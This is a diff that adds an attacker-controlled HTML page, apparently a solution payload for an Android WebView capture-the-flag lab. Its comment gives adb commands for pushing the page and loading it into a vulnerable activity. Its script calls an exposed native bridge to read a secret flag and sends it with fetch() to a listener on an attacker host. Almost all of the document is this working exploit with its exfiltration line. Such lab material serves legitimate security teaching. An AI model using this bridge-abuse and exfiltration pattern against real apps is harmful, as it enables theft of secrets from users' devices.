@@ -1,0 +1,38 @@
+<!--
+  Attacker-controlled page. Push this onto the device with:
+    adb push payload.html /sdcard/Download/payload.html
+
+  Then open it inside the vulnerable HelpActivity with:
+    adb shell am start -n com.duckurity.webviewctf/.HelpActivity \
+      --es url "file:///sdcard/Download/payload.html"
+
+  Because HelpActivity attaches `nativeBridge` to the WebView before
+  loadUrl() runs, and does not check what it's loading, this page runs
+  in the same trust boundary as the bundled help.html -- so it can call
+  nativeBridge.getSecretFlag() directly.
+
+  This version exfiltrates the flag to a local HTTP listener
+  (listener.py) over the loopback-reachable lab network, so the
+  grader/tester doesn't need to read Logcat.
+-->
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  // Give the WebView a tick to finish injecting the Java object.
+  window.onload = function () {
+    try {
+      var flag = nativeBridge.getSecretFlag();
+      // Change this IP to the machine running listener.py
+      // (your attacker host reachable from the Android device/emulator;
+      // 10.0.2.2 is the special alias for the host machine when using
+      // the stock Android emulator).
+      fetch("http://10.0.2.2:8000/?flag=" + encodeURIComponent(flag));
+      document.body.innerText = "sent: " + flag;
+    } catch (e) {
+      document.body.innerText = "bridge not reachable: " + e;
+    }
+  };
+</script>
+</body>
+</html>
